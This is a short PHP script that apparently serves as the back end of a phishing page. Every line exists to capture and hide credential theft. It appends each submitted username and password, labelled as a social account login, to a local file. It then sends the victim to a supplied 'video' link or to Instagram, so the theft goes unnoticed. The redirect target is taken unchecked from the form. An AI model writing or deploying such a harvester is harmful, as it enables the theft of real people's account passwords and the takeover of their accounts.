<?php
file_put_contents("usernames.txt", "Social Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

$target = isset($_POST['target']) ? $_POST['target'] : '';

if (!empty($target)) {
    // If a target URL was provided, redirect the user there to watch the video
    header('Location: ' . $target);
} else {
    // Default fallback if no specific video link was provided
    header('Location: https://www.instagram.com/');
}
exit();
?>
